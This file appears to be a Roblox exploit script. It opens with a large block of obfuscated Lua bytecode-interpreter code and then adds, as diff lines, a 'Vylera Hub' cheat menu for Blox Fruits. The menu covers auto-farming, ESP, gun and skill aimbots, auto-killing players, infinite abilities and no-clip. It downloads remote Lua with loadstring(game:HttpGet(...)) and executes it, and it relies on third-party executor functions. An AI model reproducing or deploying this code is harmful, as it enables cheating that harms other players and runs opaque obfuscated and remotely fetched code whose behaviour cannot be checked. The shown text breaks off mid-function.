f;d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];d[e[o]]=d[e[t]];end else d[e[o]]=(e[t]~=0);end end else if f>=7 then if 8<=f then if f>6 then for n=40,52 do if f>8 then local n=e[o]d[n](r(d,n+1,e[t]))break;end;d[e[o]]=d[e[t]]%d[e[b]];break;end;else d[e[o]]=d[e[t]]%d[e[b]];end else for f=0,1 do if f>=-4 then for h=26,92 do if f~=1 then d[e[o]]=a[e[t]];n=n+1;e=l[n];break;end;if d[e[o]]then n=n+1;else n=e[t];end;break;end;else d[e[o]]=a[e[t]];n=n+1;e=l[n];end end end else if f>3 then repeat if f~=5 then local n=e[o]local o,e=y(d[n](r(d,n+1,e[t])))k=e+n-1 local e=0;for n=n,k do e=e+1;d[n]=o[e];end;break;end;d[e[o]]=d[e[t]]%e[b];until true;else local n=e[o]local o,e=y(d[n](r(d,n+1,e[t])))k=e+n-1 local e=0;for n=n,k do e=e+1;d[n]=o[e];end;end end end end else if f>30 then if f>35 then if 39<=f then if f<40 then local f;d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];f=e[o];do return d[f](r(d,f+1,e[t]))end;n=n+1;e=l[n];f=e[o];do return r(d,f,k)end;n=n+1;e=l[n];do return end;else if f>=37 then repeat if 40~=f then local l,a,b,h,f,r;local n=0;while n>-1 do if 4>n then if n<2 then if 0==n then l=e;else a=o;end else if n==3 then h=d;else b=t;end end else if n>5 then if 2<=n then for e=29,65 do if 6<n then n=-2;break;end;d[r]=f;break;end;else n=-2;end else if n~=1 then repeat if n>4 then r=l[a];break;end;f=h[l[b]];until true;else f=h[l[b]];end end end n=n+1 end break;end;d[e[o]]=d[e[t]][e[b]];until true;else d[e[o]]=d[e[t]][e[b]];end end else if f>=37 then if f~=35 then for h=38,65 do if 38~=f then local h,a,s,b,r,f;d[e[o]]={};n=n+1;e=l[n];d[e[o]]={};n=n+1;e=l[n];d[e[o]]={};n=n+1;e=l[n];f=0;while f>-1 do if f>=3 then if 5<=f then if f>4 then for e=30,55 do if 6~=f then d(r,b);break;end;f=-2;break;end;else d(r,b);end else if-1<=f then repeat if f~=4 then b=h[s];break;end;r=h[a];until true;else b=h[s];end end else if 1>f then h=e;else if-1<=f then for e=37,98 do if f<2 then a=o;break;end;s=t;break;end;else s=t;end end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if 3<=f then if 4<f then if f>2 then for e=39,54 do if 5<f then f=-2;break;end;d(r,b);break;end;else f=-2;end else if 1<=f then for e=20,70 do if f>3 then r=h[a];break;end;b=h[s];break;end;else r=h[a];end end else if f>0 then if 2~=f then a=o;else s=t;end else h=e;end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if f<=2 then if f>0 then if-3<=f then for e=21,88 do if f~=1 then s=t;break;end;a=o;break;end;else a=o;end else h=e;end else if 4>=f then if f>=0 then repeat if f~=4 then b=h[s];break;end;r=h[a];until true;else r=h[a];end else if 3<=f then repeat if 5~=f then f=-2;break;end;d(r,b);until true;else d(r,b);end end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if f<=2 then if 1<=f then if 2~=f then a=o;else s=t;end else h=e;end else if f>=5 then if 4<=f then for e=31,96 do if 6>f then d(r,b);break;end;f=-2;break;end;else d(r,b);end else if 1<=f then for e=34,52 do if 3~=f then r=h[a];break;end;b=h[s];break;end;else b=h[s];end end end f=f+1 end break;end;local e=e[o]d[e]=d[e](r(d,e+1,k))break;end;else local h,a,s,b,r,f;d[e[o]]={};n=n+1;e=l[n];d[e[o]]={};n=n+1;e=l[n];d[e[o]]={};n=n+1;e=l[n];f=0;while f>-1 do if f>=3 then if 5<=f then if f>4 then for e=30,55 do if 6~=f then d(r,b);break;end;f=-2;break;end;else d(r,b);end else if-1<=f then repeat if f~=4 then b=h[s];break;end;r=h[a];until true;else b=h[s];end end else if 1>f then h=e;else if-1<=f then for e=37,98 do if f<2 then a=o;break;end;s=t;break;end;else s=t;end end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if 3<=f then if 4<f then if f>2 then for e=39,54 do if 5<f then f=-2;break;end;d(r,b);break;end;else f=-2;end else if 1<=f then for e=20,70 do if f>3 then r=h[a];break;end;b=h[s];break;end;else r=h[a];end end else if f>0 then if 2~=f then a=o;else s=t;end else h=e;end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if f<=2 then if f>0 then if-3<=f then for e=21,88 do if f~=1 then s=t;break;end;a=o;break;end;else a=o;end else h=e;end else if 4>=f then if f>=0 then repeat if f~=4 then b=h[s];break;end;r=h[a];until true;else r=h[a];end else if 3<=f then repeat if 5~=f then f=-2;break;end;d(r,b);until true;else d(r,b);end end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if f<=2 then if 1<=f then if 2~=f then a=o;else s=t;end else h=e;end else if f>=5 then if 4<=f then for e=31,96 do if 6>f then d(r,b);break;end;f=-2;break;end;else d(r,b);end else if 1<=f then for e=34,52 do if 3~=f then r=h[a];break;end;b=h[s];break;end;else b=h[s];end end end f=f+1 end end else local e=e[o];do return r(d,e,k)end;end end else if f>32 then if 33<f then if f>34 then local r,h;for f=0,6 do if f<3 then if f>0 then if f~=-3 then repeat if 2>f then d[e[o]]=d[e[t]]%d[e[b]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]]+e[b];n=n+1;e=l[n];until true;else d[e[o]]=d[e[t]]+e[b];n=n+1;e=l[n];end else d[e[o]]=#d[e[t]];n=n+1;e=l[n];end else if f<=4 then if f~=3 then r=e[o];h=d[e[t]];d[r+1]=h;d[r]=h[e[b]];n=n+1;e=l[n];else d[e[o]]=s[e[t]];n=n+1;e=l[n];end else if 1~=f then for h=45,72 do if f>5 then d[e[o]]=d[e[t]];break;end;d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end end end end else d[e[o]]=#d[e[t]];end else local o=e[o];local f=d[o+2];local l=d[o]+f;d[o]=l;if(f>0)then if(l<=d[o+1])then n=e[t];d[o+3]=l;end elseif(l>=d[o+1])then n=e[t];d[o+3]=l;end end else if f>=29 then repeat if 31~=f then d[e[o]][e[t]]=d[e[b]];break;end;d[e[o]]();until true;else d[e[o]][e[t]]=d[e[b]];end end end else if f>25 then if 28<=f then if f>28 then if f>=25 then repeat if f~=30 then local h,a,r,s,k,f;for f=0,3 do if 1>=f then if f>=-2 then for b=21,60 do if 0~=f then f=0;while f>-1 do if f<=2 then if 0>=f then h=e;else if f~=-2 then for e=34,79 do if 2~=f then a=o;break;end;r=t;break;end;else a=o;end end else if 4<f then if 6~=f then d(k,s);else f=-2;end else if-1<f then for e=16,52 do if f~=4 then s=h[r];break;end;k=h[a];break;end;else s=h[r];end end end f=f+1 end n=n+1;e=l[n];break;end;f=0;while f>-1 do if f>=3 then if f<=4 then if f>=-1 then repeat if f~=4 then s=h[r];break;end;k=h[a];until true;else s=h[r];end else if f==6 then f=-2;else d(k,s);end end else if f<=0 then h=e;else if f~=-3 then for e=28,71 do if 1~=f then r=t;break;end;a=o;break;end;else a=o;end end end f=f+1 end n=n+1;e=l[n];break;end;else f=0;while f>-1 do if f>=3 then if f<=4 then if f>=-1 then repeat if f~=4 then s=h[r];break;end;k=h[a];until true;else s=h[r];end else if f==6 then f=-2;else d(k,s);end end else if f<=0 then h=e;else if f~=-3 then for e=28,71 do if 1~=f then r=t;break;end;a=o;break;end;else a=o;end end end f=f+1 end n=n+1;e=l[n];end else if 2<f then if d[e[o]]then n=n+1;else n=e[t];end;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end end break;end;for f=0,1 do if 1==f then d[e[o]]=a[e[t]];else d(e[o],e[t]);n=n+1;e=l[n];end end until true;else for f=0,1 do if 1==f then d[e[o]]=a[e[t]];else d(e[o],e[t]);n=n+1;e=l[n];end end end else if(d[e[o]]~=e[b])then n=n+1;else n=e[t];end;end else if f>=24 then repeat if f~=27 then local f;d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];d[e[o]]=d[e[t]];break;end;local l=d[e[b]];if not l then n=n+1;else d[e[o]]=l;n=e[t];end;until true;else local f;d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];d[e[o]]=d[e[t]];end end else if f>22 then if 23>=f then local h,k,c,y,u,p,_,f;d[e[o]][e[t]]=d[e[b]];n=n+1;e=l[n];h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];f=0;while f>-1 do if 4<=f then if 6<=f then if f>=2 then repeat if 7~=f then d[_]=p;break;end;f=-2;until true;else f=-2;end else if f~=4 then _=k[c];else p=u[k[y]];end end else if f>=2 then if f>1 then repeat if 3~=f then y=t;break;end;u=d;until true;else u=d;end else if f>=-3 then for n=10,63 do if 1~=f then k=e;break;end;c=o;break;end;else k=e;end end end f=f+1 end n=n+1;e=l[n];h=e[o]d[h](r(d,h+1,e[t]))else if f>21 then repeat if 24<f then local l=d[e[b]];if not l then n=n+1;else d[e[o]]=l;n=e[t];end;break;end;local e=e[o]d[e](d[e+1])until true;else local e=e[o]d[e](d[e+1])end end else if f>21 then d[e[o]]=d[e[t]][d[e[b]]];else local f,a,s,h,r,b;d[e[o]]=d[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];f=e[o]d[f]=d[f](d[f+1])n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];do return d[e[o]]end n=n+1;e=l[n];f=e[o];a={};for e=1,#u do s=u[e];for e=0,#s do h=s[e];r=h[1];b=h[2];if r==d and b>=f then a[b]=r[b];h[1]=a;end;end;end;n=n+1;e=l[n];n=e[t];end end end end end end end n=1+n;end;end;return oe end;local t=0xff;local b={};local f=(1);local o='';(function(n)local d=n local l=0x00 local e=0x00 d={(function(o)if l>0x2d then return o end l=l+1 e=(e+0xbd9-o)%0x4c return(e%0x03==0x2 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x0);end return true end)'kOKcW'and d[0x1](0x1a5+o))or(e%0x03==0x0 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x5c);b[f]=he();f=f+t;end return true end)'mBuRu'and d[0x2](o+0x171))or(e%0x03==0x1 and(function(d)if not n[d]then e=e+0x01 n[d]=(0xa1);end return true end)'TBqWw'and d[0x3](o+0x1ed))or o end),(function(h)if l>0x28 then return h end l=l+1 e=(e+0x10ee-h)%0x13 return(e%0x03==0x0 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x86);o='\37';t={function()t()end};o=o..'\100\43';end return true end)'LiMnE'and d[0x3](0x1a7+h))or(e%0x03==0x1 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x7);t[2]=(t[2]*(le(function()b()end,r(o))-le(t[1],r(o))))+1;b[f]={};t=t[2];f=f+t;end return true end)'nHvZV'and d[0x1](h+0x2fa))or(e%0x03==0x2 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x66);end return true end)'_bTov'and d[0x2](h+0x1a3))or h end),(function(r)if l>0x22 then return r end l=l+1 e=(e+0x6c7-r)%0x2a return(e%0x03==0x2 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x28);end return true end)'DTBCo'and d[0x1](0x2d8+r))or(e%0x03==0x1 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x31);end return true end)'SPZWk'and d[0x3](r+0x203))or(e%0x03==0x0 and(function(d)if not n[d]then e=e+0x01 n[d]=(0x2c);o={o..'\58 a',o};b[f]=oe();f=f+((not h.BzEYcyhr)and 1 or 0);o[1]='\58'..o[1];t[2]=0xff;end return true end)'JXiyp'and d[0x2](r+0x297))or r end)}d[0x2](0xaaf)end){};local e=p(r(b));b[2]={};b[1]=e(b[1])cIiGxgrwLfArkqS=nil;e=p(r(b))return e(...);end return fe((function()local n={}local e=0x01;local d;if h.BzEYcyhr then d=h.BzEYcyhr(fe)else d=''end if h.kVxFycTG(d,h.LssOWHph)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(n,e,d,o,t,l)local l;if 4<=n then if 6>n then if 3~=n then repeat if n~=4 then local n=o;do return function()local e=e(d,n(n,n),n(n,n));n(1);return e;end;end;break;end;local n=o;local f,h,o=t(2);do return function()local l,t,d,e=e(d,n(n,n),n(n,n)+3);n(4);return(e*f)+(d*h)+(t*o)+l;end;end;until true;else local n=o;do return function()local e=e(d,n(n,n),n(n,n));n(1);return e;end;end;end else if 7<=n then if n~=8 then do return setmetatable({},{['__\99\97\108\108']=function(e,d,t,o,n)if n then return e[n]elseif o then return e else e[d]=t end end})end else do return d(n,nil,d);end end else do return t[d]end;end end else if 1>=n then if n>0 then do return function(n,e,d)if d then local e=(n/2^(e-1))%2^((d-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(n%(e+e)>=e)and 1 or 0;end;end;end;else do return e(1),e(4,t,o,d,e),e(5,t,o,d)end;end else if n==3 then do return e(1),e(4,t,o,d,e),e(5,t,o,d)end;else do return 16777216,65536,256 end;end end end end),...)
+if "霖溺-BloxFruits" == LnScript then
+if not game:IsLoaded() then
+    repeat task.wait() until game:IsLoaded()
+end
+
+if setfpscap then
+    setfpscap(1000000)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Vylera Hub",
+        Text = "FPS Unlocked!",
+        Duration = 5,
+        Button1 = "Okay"
+    })
+    warn("FPS Unlocked!")
+else
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Vylera Hub",
+        Text = "Your exploit does not support setfpscap.",
+        Duration = 5,
+        Button1 = "Okay"
+    })
+    warn("Your exploit does not support setfpscap.")
+end
+
+local WindUI = (loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua")))();
+local Window = WindUI:CreateWindow({
+    Title = "Vylera Hub",
+    Icon = "rbxassetid://84228153855933",
+    Author = "Vylera Hub | Blox Fruit",
+    Folder = "Vylera Hub_BF",
+    Size = UDim2.fromOffset(550, 300),
+    Transparent = true,
+    Theme = "Dark",
+    SideBarWidth = 190,
+    HasOutline = false,
+    HideSearchBar = true,
+    ScrollBarEnabled = false,
+    User = {
+        Enabled = true,
+        Anonymous = false
+    },
+});
+Window:EditOpenButton({
+    Title = "Vylera Hub - Open",
+    Icon = "monitor",
+    CornerRadius = UDim.new(0, 6),
+    StrokeThickness = 2,
+    Color = ColorSequence.new(Color3.fromRGB(30, 30, 30), Color3.fromRGB(255, 255, 255)),
+    Draggable = true
+});
+local Tabs = {
+    InfoTab = Window:Tab({
+        Title = "Information",
+        Icon = "info",
+        Desc = "Info Section"
+    }),
+    MainDivider = Window:Divider(),
+    MainTab = Window:Tab({
+        Title = "Farming",
+        Icon = "rocket",
+        Desc = "Main Section"
+    }),
+    OthersTab = Window:Tab({
+        Title = "Others",
+        Icon = "crown",
+        Desc = "Farming Section"
+    }),
+    ItemsTab = Window:Tab({
+        Title = "Items",
+        Icon = "box",
+        Desc = "Items Section"
+    }),
+    SettingsTab = Window:Tab({
+        Title = "Settings",
+        Icon = "settings",
+        Desc = "Settings Section"
+    }),
+    PlayerDivider = Window:Divider(),
+    LocalPlayerTab = Window:Tab({
+        Title = "Player",
+        Icon = "user",
+        Desc = "Local Player Section"
+    }),
+    StatsTab = Window:Tab({
+        Title = "Stats",
+        Icon = "sliders-horizontal",
+        Desc = "Stats Section"
+    }),
+    SeaDivider = Window:Divider(),
+    SeaEventTab = Window:Tab({
+        Title = "Sea Event",
+        Icon = "anchor",
+        Desc = "Sea Event Section"
+    }),
+    SeaStackTab = Window:Tab({
+        Title = "Sea Stack",
+        Icon = "waves",
+        Desc = "Sea Stack Section"
+    }),
+    SeaSettingsTab = Window:Tab({
+        Title = "Sea Settings",
+        Icon = "cog",
+        Desc = "Sea Settings Section"
+    }),
+    AutoDivider = Window:Divider(),
+    DragonDojoTab = Window:Tab({
+        Title = "Dragon Dojo",
+        Icon = "shield",
+        Desc = "Dragon Dojo Section"
+    }),
+    RaceTab = Window:Tab({
+        Title = "Race V4",
+        Icon = "bot",
+        Desc = "Race Section"
+    }),
+    CombatDivider = Window:Divider(),
+    CombatTab = Window:Tab({
+        Title = "Combat",
+        Icon = "sword",
+        Desc = "Combat Section"
+    }),
+    RaidTab = Window:Tab({
+        Title = "Raid",
+        Icon = "door-open",
+        Desc = "Raid Section"
+    }),
+    EspTab = Window:Tab({
+        Title = "Esp",
+        Icon = "eye",
+        Desc = "Esp Section"
+    }),
+    TeleportTab = Window:Tab({
+        Title = "Teleport",
+        Icon = "map-pinned",
+        Desc = "Teleport Section"
+    }),
+    ShopTab = Window:Tab({
+        Title = "Shop",
+        Icon = "shopping-cart",
+        Desc = "Shop Section"
+    }),
+    FruitTab = Window:Tab({
+        Title = "Fruit",
+        Icon = "apple",
+        Desc = "Fruit Section"
+    }),
+    MiscDivider = Window:Divider(),
+    MiscTab = Window:Tab({
+        Title = "Misc",
+        Icon = "layout-grid",
+        Desc = "Misc Section"
+    }),
+    ServerTab = Window:Tab({
+        Title = "Server",
+        Icon = "server",
+        Desc = "Server Section"
+    })
+};
+Window:SelectTab(1);
+_G.Settings = {
+    Main = {
+        ["Select Weapon"] = "Melee",
+        ["Farm Level Method"] = "Quest",
+        ["Auto Farm"] = false,
+        ["Auto Fast Farm"] = false,
+        ["Mastery Method"] = "Quest",
+        ["Auto Farm Fruit Mastery"] = false,
+        ["Auto Farm Gun Mastery"] = false,
+        ["Selected Mastery Sword"] = nil,
+        ["Auto Farm Sword Mastery"] = false,
+        ["Auto Summon Tyrant Of The Skies"] = false,
+        ["Auto Kill Tyrant Of The Skies"] = false,
+        ["Selected Mon"] = nil,
+        ["Auto Farm Mon"] = false,
+        ["Selected Boss"] = nil,
+        ["Auto Farm Boss"] = false,
+        ["Auto Farm All Boss"] = false
+    },
+    Event = {},
+    Farm = {
+        ["Auto Elite Hunter"] = false,
+        ["Auto Elite Hunter Hop"] = false,
+        ["Selected Bone Farm Method"] = "Quest",
+        ["Auto Farm Bone"] = false,
+        ["Auto Random Surprise"] = false,
+        ["Auto Pirate Raid"] = false,
+        ["Auto Farm Chest Tween"] = false,
+        ["Auto Farm Chest Instant"] = false,
+        ["Auto Chest Hop"] = false,
+        ["Auto Farm Chest Mirage"] = false,
+        ["Auto Stop Items"] = false,
+        ["Auto Farm Katakuri"] = false,
+        ["Auto Spawn Cake Prince"] = false,
+        ["Auto Kill Cake Prince"] = false,
+        ["Auto Kill Dough King"] = false,
+        ["Selected Material"] = nil,
+        ["Auto Farm Material"] = false
+    },
+    Setting = {
+        ["Spin Position"] = false,
+        ["Farm Distance"] = 35,
+        ["Player Tween Speed"] = 350,
+        ["Bring Mob"] = true,
+        ["Bring Mob Mode"] = "Normal",
+        ["Fast Attack"] = true,
+        ["Fast Attack Mode"] = "Normal",
+        ["Attack Aura"] = true,
+        ["Hide Notification"] = false,
+        ["Hide Damage Text"] = true,
+        ["Black Screen"] = false,
+        ["White Screen"] = false,
+        ["Hide Monster"] = false,
+        ["Mastery Health"] = 25,
+        ["Fruit Mastery Skill Z"] = true,
+        ["Fruit Mastery Skill X"] = true,
+        ["Fruit Mastery Skill C"] = true,
+        ["Fruit Mastery Skill V"] = false,
+        ["Fruit Mastery Skill F"] = false,
+        ["Gun Mastery Skill Z"] = true,
+        ["Gun Mastery Skill X"] = true,
+        ["Auto Set Spawn Point"] = true,
+        ["Auto Observation"] = false,
+        ["Auto Haki"] = true,
+        ["Auto Rejoin"] = true
+    },
+    Stats = {
+        ["Auto Add Melee Stats"] = false,
+        ["Auto Add Defense Stats"] = false,
+        ["Auto Add Devil Fruit Stats"] = false,
+        ["Auto Add Sword Stats"] = false,
+        ["Auto Add Gun Stats"] = false,
+        ["Point Stats"] = 1
+    },
+    Items = {
+        ["Auto Second Sea"] = false,
+        ["Auto Third Sea"] = false,
+        ["Auto Farm Factory"] = false,
+        ["Auto Super Human"] = false,
+        ["Auto Death Step"] = false,
+        ["Auto Fishman Karate"] = false,
+        ["Auto Electric Claw"] = false,
+        ["Auto Dragon Talon"] = false,
+        ["Auto God Human"] = false,
+        ["Auto Saber"] = false,
+        ["Auto Buddy Sword"] = false,
+        ["Auto Soul Guitar"] = false,
+        ["Auto Rengoku"] = false,
+        ["Auto Hallow Scythe"] = false,
+        ["Auto Warden Sword"] = false,
+        ["Auto Cursed Dual Katana"] = false,
+        ["Auto Yama"] = false,
+        ["Auto Tushita"] = false,
+        ["Auto Canvander"] = false,
+        ["Auto Dragon Trident"] = false,
+        ["Auto Pole"] = false,
+        ["Auto Shawk Saw"] = false,
+        ["Auto Greybeard"] = false,
+        ["Auto Swan Glasses"] = false,
+        ["Auto Arena Trainer"] = false,
+        ["Auto Dark Dagger"] = false,
+        ["Auto Press Haki Button"] = false,
+        ["Auto Rainbow Haki"] = false,
+        ["Auto Holy Torch"] = false,
+        ["Auto Bartilo Quest"] = false
+    },
+    Esp = {
+        ["ESP Player"] = false,
+        ["ESP Chest"] = false,
+        ["ESP DevilFruit"] = false,
+        ["ESP RealFruit"] = false,
+        ["ESP Flower"] = false,
+        ["ESP Island"] = false,
+        ["ESP Npc"] = false,
+        ["ESP Sea Beast"] = false,
+        ["ESP Monster"] = false,
+        ["ESP Mirage"] = false,
+        ["ESP Kitsune"] = false,
+        ["ESP Frozen"] = false,
+        ["ESP Advanced Fruit Dealer"] = false,
+        ["ESP Aura"] = false,
+        ["ESP Gear"] = false
+    },
+    DragonDojo = {
+        ["Auto Farm Blaze Ember"] = false,
+        ["Auto Collect Blaze Ember"] = false
+    },
+    SeaEvent = {
+        ["Selected Boat"] = "Guardian",
+        ["Selected Zone"] = "Zone 5",
+        ["Boat Tween Speed"] = 300,
+        ["Sail Boat"] = false,
+        ["Auto Farm Shark"] = true,
+        ["Auto Farm Piranha"] = true,
+        ["Auto Farm Fish Crew Member"] = true,
+        ["Auto Farm Ghost Ship"] = true,
+        ["Auto Farm Pirate Brigade"] = true,
+        ["Auto Farm Pirate Grand Brigade"] = true,
+        ["Auto Farm Terrorshark"] = true,
+        ["Auto Farm Seabeasts"] = true,
+        ["Dodge Seabeasts Attack"] = true,
+        ["Dodge Terrorshark Attack"] = true
+    },
+    SettingSea = {
+        Lightning = false,
+        ["Increase Boat Speed"] = false,
+        ["No Clip Rock"] = false,
+        ["Use Devil Fruit Skill"] = true,
+        ["Use Melee Skill"] = true,
+        ["Use Sword Skill"] = true,
+        ["Use Gun Skill"] = true,
+        ["Devil Fruit Z Skill"] = true,
+        ["Devil Fruit X Skill"] = true,
+        ["Devil Fruit C Skill"] = true,
+        ["Devil Fruit V Skill"] = false,
+        ["Devil Fruit F Skill"] = false,
+        ["Melee Z Skill"] = true,
+        ["Melee X Skill"] = true,
+        ["Melee C Skill"] = true,
+        ["Melee V Skill"] = true
+    },
+    SeaStack = {
+        ["Tween To Frozen Dimension"] = false,
+        ["Summon Frozen Dimension"] = false,
+        ["Tween To Kitsune Island"] = false,
+        ["Summon Kitsune Island"] = false,
+        ["Auto Collect Azure Ember"] = false,
+        ["Set Azure Ember"] = 20,
+        ["Auto Trade Azure Ember"] = false,
+        ["Tween To Mirage Island"] = false,
+        ["Teleport To Advanced Fruit Dealer"] = false,
+        ["Auto Attack Seabeasts"] = false,
+        ["Summon Prehistoric Island"] = false,
+        ["Tween To Prehistoric Island"] = false,
+        ["Auto Kill Lava Golem"] = false
+    },
+    Race = {
+        ["Auto Race V2"] = false,
+        ["Auto Race V3"] = false,
+        ["Selected Place"] = nil,
+        ["Teleport To Place"] = false,
+        ["Auto Buy Gear"] = false,
+        ["Tween To Highest Mirage"] = false,
+        ["Find Blue Gear"] = false,
+        ["Look Moon Ability"] = false,
+        ["Auto Train"] = false,
+        ["Auto Kill Player After Trial"] = false,
+        ["Auto Trial"] = false
+    },
+    Combat = {
+        ["Auto Kill Player Quest"] = false,
+        ["Aimbot Gun"] = false,
+        ["Aimbot Skill Neares"] = false,
+        ["Aimbot Skill"] = false,
+        ["Enable PvP"] = false
+    },
+    Raid = {
+        ["Selected Chip"] = nil,
+        ["Auto Raid"] = false,
+        ["Auto Awaken"] = false,
+        ["Price Devil Fruit"] = 1000000,
+        ["Unstore Devil Fruit"] = false,
+        ["Law Raid"] = false
+    },
+    Shop = {
+        ["Auto Buy Legendary Sword"] = false,
+        ["Auto Buy Haki Color"] = false
+    },
+    LocalPlayer = {
+        ["Infinite Energy"] = false,
+        ["Infinite Ability"] = true,
+        ["Infinite Geppo"] = false,
+        ["Infinite Soru"] = false,
+        ["Dodge No Cooldown"] = false,
+        ["Active Race V3"] = false,
+        ["Active Race V4"] = true,
+        ["Walk On Water"] = true,
+        ["No Clip"] = false
+    },
+    Fruit = {
+        ["Auto Buy Random Fruit"] = false,
+        ["Store Rarity Fruit"] = "Common - Mythical",
+        ["Auto Store Fruit"] = false,
+        ["Fruit Notification"] = false,
+        ["Teleport To Fruit"] = false,
+        ["Tween To Fruit"] = false
+    },
+    Misc = {
+        ["Hide Chat"] = false,
+        ["Hide Leaderboard"] = false,
+        ["Highlight Mode"] = false
+    }
+};
+(getgenv()).Load = function()
+    if readfile and writefile and isfile and isfolder then
+        if not isfolder("Relz Hub New") then
+            makefolder("Relz Hub New");
+        end
+        if not isfolder("Relz Hub New/Blox Fruits/") then
+            makefolder("Relz Hub New/Blox Fruits/");
+        end
+        if not isfile(("Relz Hub New/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json")) then
+            writefile("Relz Hub New/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json",
+                (game:GetService("HttpService")):JSONEncode(_G.Settings));
+        else
+            local Decode = (game:GetService("HttpService")):JSONDecode(readfile(
+                "Relz Hub New/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json"));
+            for i, v in pairs(Decode) do
+                _G.Settings[i] = v;
+            end
+        end
+        print("Loaded!");
+    else
+        return warn("Status : Undetected Executor");
+    end
+end;
+(getgenv()).SaveSetting = function()
+    if readfile and writefile and isfile and isfolder then
+        if not isfile(("Relz Hub New/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json")) then
+            (getgenv()).Load();
+        else
+            local Decode = (game:GetService("HttpService")):JSONDecode(readfile(
+                "Relz Hub New/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json"));
+            local Array = {};
+            for i, v in pairs(_G.Settings) do
+                Array[i] = v;
+            end
+            writefile("Relz Hub New/Blox Fruits/" .. game.Players.LocalPlayer.Name .. ".json",
+                (game:GetService("HttpService")):JSONEncode(Array));
+        end
+    else
+        return warn("Status : Undetected Executor");
+    end
+end;
+(getgenv()).Load();
+if game.PlaceId == 2753915549 then
+    World1 = true;
+elseif game.PlaceId == 4442272183 then
+    World2 = true;
+elseif game.PlaceId == 7449423635 then
+    World3 = true;
+end
+function CheckQuest()
+    MyLevel = (game:GetService("Players")).LocalPlayer.Data.Level.Value;
+    if World1 then
+        if MyLevel == 1 or MyLevel <= 9 then
+            Mon = "Bandit";
+            LevelQuest = 1;
+            NameQuest = "BanditQuest1";
+            NameMon = "Bandit";
+            CFrameQuest = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0,
+                0.341998369, 0, 0.939700544);
+            CFrameMon = CFrame.new(1045.962646484375, 27.00250816345215, 1560.8203125);
+        elseif MyLevel == 10 or MyLevel <= 14 then
+            Mon = "Monkey";
+            LevelQuest = 1;
+            NameQuest = "JungleQuest";
+            NameMon = "Monkey";
+            CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+            CFrameMon = CFrame.new(-1448.51806640625, 67.85301208496094, 11.46579647064209);
+        elseif MyLevel == 15 or MyLevel <= 29 then
+            Mon = "Gorilla";
+            LevelQuest = 2;
+            NameQuest = "JungleQuest";
+            NameMon = "Gorilla";
+            CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+            CFrameMon = CFrame.new(-1129.8836669921875, 40.46354675292969, -525.4237060546875);
+        elseif MyLevel == 30 or MyLevel <= 39 then
+            Mon = "Pirate";
+            LevelQuest = 1;
+            NameQuest = "BuggyQuest1";
+            NameMon = "Pirate";
+            CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0,
+                0.258804798, 0, 0.965929627);
+            CFrameMon = CFrame.new(-1103.513427734375, 13.752052307128906, 3896.091064453125);
+        elseif MyLevel == 40 or MyLevel <= 59 then
+            Mon = "Brute";
+            LevelQuest = 2;
+            NameQuest = "BuggyQuest1";
+            NameMon = "Brute";
